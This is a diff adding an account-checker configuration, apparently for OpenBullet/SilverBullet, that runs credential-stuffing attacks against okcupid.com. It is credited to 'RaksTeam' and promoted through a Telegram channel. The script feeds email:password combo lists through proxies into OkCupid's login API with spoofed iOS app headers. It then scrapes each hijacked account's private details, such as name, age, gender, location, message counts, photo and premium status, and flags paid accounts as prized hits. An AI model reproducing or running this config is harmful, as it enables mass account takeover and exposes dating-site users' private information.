@@ -1,0 +1,172 @@
+[SETTINGS]
+{
+  "Name": "okcupid.com",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-15T13:59:20.4335895+05:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "CommanderX | RaksTeam",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "okcupid",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
+#Login REQUEST POST "https://okcupid.com/graphql" 
+  CONTENT "{\"operationName\":\"LoginWithEmail\",\"query\":\"mutation LoginWithEmail($input: AuthUserLoginWithEmailInput!) {\\\\n  authUserLoginWithEmail(input: $input) {\\\\n    __typename\\\\n    userid\\\\n    statusCode\\\\n    reenableAuthCode\\\\n    reenableUserid\\\\n    onboardingIncomplete\\\\n  }\\\\n}\",\"variables\":{\"input\":{\"authCode\":null,\"deviceId\":\"E4911E58-FCA1-4577-8D24-34E751E2050C\",\"email\":\"<USER>\",\"password\":\"<PASS>\"}}}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": authority: okcupid.com" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-us" 
+  HEADER "apollographql-client-name: com.okcupid.app-apollo-ios" 
+  HEADER "apollographql-client-version: 54.0.0-2" 
+  HEADER "user-agent: OkCupid/2 CFNetwork/1197 Darwin/20.0.0" 
+  HEADER "x-apollo-operation-name: LoginWithEmail" 
+  HEADER "x-apollo-operation-type: mutation" 
+  HEADER "x-okcupid-locale: en" 
+  HEADER "x-okcupid-platform: ios" 
+  HEADER "x-okcupid-version: 54.0.0" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "AuthUserPayload\",\"userid\":null" 
+    KEY "statusCode\":104" 
+    KEY "onboardingIncomplete\":false" 
+  KEYCHAIN Success OR 
+    KEY "onboardingIncomplete\":true" 
+    KEY "statusCode\":0" 
+
+#Subscription REQUEST POST "https://okcupid.com/graphql" 
+  CONTENT "{\"operationName\":\"SessionQuery\",\"query\":\"query SessionQuery {\\\\n  session {\\\\n    __typename\\\\n    isStaff\\\\n    guestId\\\\n    ipCountry\\\\n    shouldUpdateAppDetect\\\\n    isAppsConsentKillswitchEnabled\\\\n    ...GateKeeperChecksFragment\\\\n    CONVERSATION_DARKMODE_IOS_V2: experiment(name: \\\"CONVERSATION_DARKMODE_IOS_V2\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    IOS_NATIVE_PROFILE_DEV: experiment(name: \\\"IOS_NATIVE_PROFILE_DEV\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    REMOVE_INTRO_MERCH_APPS: experiment(name: \\\"REMOVE_INTRO_MERCH_APPS\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    IOS_INCOGNITO_RATE_CARD: experiment(name: \\\"IOS_INCOGNITO_RATE_CARD\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    IOS_ATT_MODAL_V1: experiment(name: \\\"IOS_ATT_MODAL_V1\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    SWLY_SWAP: experiment(name: \\\"SWLY_SWAP\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    ICEBREAKER: experiment(name: \\\"ICEBREAKER\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    IOS_P2P2_V2: experiment(name: \\\"IOS_P2P2_V2\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    IOS_NATIVE_REBOARDING_DEV: experiment(name: \\\"IOS_NATIVE_REBOARDING_DEV\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    NEW_LIKES_CELEBRATION_MODAL_IOS_V2: experiment(\\\\n      name: \\\"NEW_LIKES_CELEBRATION_MODAL_IOS_V2\\\"\\\\n    ) {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    IDENTITY_TAGS_IOS_DEV: experiment(name: \\\"IDENTITY_TAGS_IOS_DEV\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n    TOP_LEVEL_VOTING_UPDATE: experiment(name: \\\"TOP_LEVEL_VOTING_UPDATE\\\") {\\\\n      __typename\\\\n      group\\\\n    }\\\\n  }\\\\n  me {\\\\n    __typename\\\\n    id\\\\n    displayname\\\\n    emailAddress\\\\n    username\\\\n    realname\\\\n    age\\\\n    binaryGenderLetter\\\\n    orientations\\\\n    unitPreference\\\\n    userLocation {\\\\n      __typename\\\\n      publicName\\\\n    }\\\\n    notifications {\\\\n      __typename\\\\n      type\\\\n      title\\\\n      subtitle\\\\n      redirectPathURL\\\\n      isViaSpotlight\\\\n    }\\\\n    isOnline\\\\n    hasInstagram\\\\n    readReceiptTokenCount\\\\n    stackPassTokenCount\\\\n    superlikeTokenCount\\\\n    hasMetPhotoRequirements\\\\n    hasSeenIdentityTagsDiscoverabilityModal: hasSeenUserGuide(\\\\n      feature: IDENTITY_TAGS\\\\n    )\\\\n    joinDate\\\\n    activeBoost {\\\\n      __typename\\\\n      id\\\\n    }\\\\n    lastBoost {\\\\n      __typename\\\\n      sawReport\\\\n    }\\\\n    boostTokenCount\\\\n    primaryImage {\\\\n      __typename\\\\n      square400\\\\n    }\\\\n    likesCap {\\\\n      __typename\\\\n      ...LikesCapFragment\\\\n    }\\\\n    ...ApolloNotificationCounts\\\\n    ...SubscriptionInfo\\\\n    globalPreferences {\\\\n      __typename\\\\n      gender {\\\\n        __typename\\\\n        values\\\\n      }\\\\n    }\\\\n  }\\\\n}\\\\nfragment GateKeeperChecksFragment on Session {\\\\n  __typename\\\\n  gatekeeperChecks {\\\\n    __typename\\\\n    APP_FORCE_UPDATE\\\\n    GDPR_AGE_REDIRECT\\\\n    ONBOARDING_MANDATORY_REDIRECT\\\\n    REBOARDING_MANDATORY_REDIRECT\\\\n    TERMS_MANDATORY_REDIRECT\\\\n    REALNAMES_REDIRECT\\\\n    NON_MONOGAMY_REBOARDING\\\\n    SMS_MANDATORY_REDIRECT\\\\n    PASSWORD_MANDATORY_REDIRECT\\\\n    BLOCK_PERSONALIZED_MARKETING\\\\n    HAS_PHONE\\\\n    SMS_KILL_SWITCH\\\\n    NEEDS_DETAILS_REBOARDING\\\\n    USE_NEW_INSTAGRAM_API\\\\n    IS_INDIAN_USER\\\\n    GLOBAL_PREFERENCES\\\\n    SUPERLIKES\\\\n    HIDE_INTROS_TAB\\\\n    MARKETING_OPT_IN_NEW_USER\\\\n    IDENTITY_TAGS_QUALIFIES\\\\n    GIF_SEARCH\\\\n  }\\\\n}\\\\nfragment LikesCapFragment on LikesCap {\\\\n  __typename\\\\n  likesCapTotal\\\\n  likesRemaining\\\\n  viewCount\\\\n  resetTime\\\\n}\\\\nfragment ApolloNotificationCounts on User {\\\\n  __typename\\\\n  notificationCounts {\\\\n    __typename\\\\n    messages\\\\n    likesIncoming\\\\n    likesMutual\\\\n    intros\\\\n  }\\\\n}\\\\nfragment SubscriptionInfo on User {\\\\n  __typename\\\\n  unlimitedLikesSubscriptionFeature: featureSubscription(feature: UNLIMITED_LIKES) {\\\\n    __typename\\\\n    ...SubscriptionFeature\\\\n  }\\\\n  seeWhoLikesYouSubscriptionFeature: featureSubscription(\\\\n    feature: SEE_WHO_LIKES_YOU\\\\n  ) {\\\\n    __typename\\\\n    ...SubscriptionFeature\\\\n  }\\\\n  ALIST_BASIC: hasPremium(name: ALIST_BASIC)\\\\n  ALIST_PREMIUM: hasPremium(name: ALIST_PREMIUM)\\\\n  INCOGNITO: hasPremium(name: INCOGNITO_BUNDLE)\\\\n}\\\\nfragment SubscriptionFeature on FeatureSubscription {\\\\n  __typename\\\\n  timeOfActualLoss\\\\n  wasEverActive\\\\n  isActive\\\\n}\",\"variables\":null}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": authority: okcupid.com" 
+  HEADER "accept: */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-us" 
+  HEADER "apollographql-client-name: com.okcupid.app-apollo-ios" 
+  HEADER "apollographql-client-version: 54.0.0-2" 
+  HEADER "user-agent: OkCupid/2 CFNetwork/1197 Darwin/20.0.0" 
+  HEADER "x-apollo-operation-name: SessionQuery" 
+  HEADER "x-apollo-operation-type: query" 
+  HEADER "x-okcupid-locale: en" 
+  HEADER "x-okcupid-platform: ios" 
+  HEADER "x-okcupid-version: 54.0.0" 
+
+#SUPERLIKES PARSE "<SOURCE>" LR "SUPERLIKES\":" ",\"" CreateEmpty=FALSE -> CAP "SUPERLIKES" 
+
+#displayname PARSE "<SOURCE>" LR "displayname\":\"" "\",\"" CreateEmpty=FALSE -> CAP "displayname" 
+
+#age PARSE "<SOURCE>" LR "age\":" ",\"" CreateEmpty=FALSE -> CAP "age" 
+
+#1 PARSE "<SOURCE>" LR "binaryGenderLetter\":\"" "\",\"" CreateEmpty=FALSE -> CAP "1" 
+
+#Gender FUNCTION Translate 
+  KEY "m" VALUE "Male" 
+  KEY "f" VALUE "Female" 
+  "<1>" -> CAP "Gender" 
+
+#userLocation PARSE "<SOURCE>" LR "publicName\":[\"" "\"]},\"" CreateEmpty=FALSE -> CAP "userLocation" 
+
+#hasInstagram PARSE "<SOURCE>" LR "hasInstagram\":" ",\"" CreateEmpty=FALSE -> CAP "hasInstagram" 
+
+#2 PARSE "<SOURCE>" LR "joinDate\":" ",\"" -> VAR "2" 
+
+#joinDate FUNCTION UnixTimeToDate "dd-MM-yyyy" "<2>" -> CAP "joinDate" 
+
+#activeBoost PARSE "<SOURCE>" LR "activeBoost\":" ",\"" CreateEmpty=FALSE -> CAP "activeBoost" 
+
+#boostTokenCount PARSE "<SOURCE>" LR "boostTokenCount\":" ",\"" CreateEmpty=FALSE -> CAP "boostTokenCount" 
+
+#likesCapTotal PARSE "<SOURCE>" LR "likesCapTotal\":" ",\"" CreateEmpty=FALSE -> CAP "likesCapTotal" 
+
+#likesRemaining PARSE "<SOURCE>" LR "likesRemaining\":" ",\"" CreateEmpty=FALSE -> CAP "likesRemaining" 
+
+#viewCount PARSE "<SOURCE>" LR "viewCount\":" ",\"" CreateEmpty=FALSE -> CAP "viewCount" 
+
+#messages PARSE "<SOURCE>" LR "messages\":" ",\"" CreateEmpty=FALSE -> CAP "messages" 
+
+#likesIncoming PARSE "<SOURCE>" LR "likesIncoming\":" ",\"" CreateEmpty=FALSE -> CAP "likesIncoming" 
+
+#likesMutual PARSE "<SOURCE>" LR "likesMutual\":" ",\"" CreateEmpty=FALSE -> CAP "likesMutual" 
+
+#ALIST_BASIC PARSE "<SOURCE>" LR "ALIST_BASIC\":" ",\"" CreateEmpty=FALSE -> CAP "ALIST_BASIC" 
+
+#ALIST_PREMIUM PARSE "<SOURCE>" LR "ALIST_PREMIUM\":" ",\"" CreateEmpty=FALSE -> CAP "ALIST_PREMIUM" 
+
+#INCOGNITO PARSE "<SOURCE>" LR "INCOGNITO\":" ",\"" CreateEmpty=FALSE -> CAP "INCOGNITO" 
+
+#photo PARSE "<SOURCE>" LR "Photo\",\"square400\":\"" "\"},\"" CreateEmpty=FALSE -> CAP "photo" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "ALIST_PREMIUM" Contains "false" 
+  KEYCHAIN Success OR 
+    KEY "<ALIST_PREMIUM>" Contains "true" 
+
+FUNCTION Constant "CommanderX18 | RaksTeam" -> CAP "Config By" 
+
+!===================================
+!Read me: 
+! Don't forget the credit of config
+! Share with Credit
+! Telegram Channel : @RaksTeam
+!===================================
+
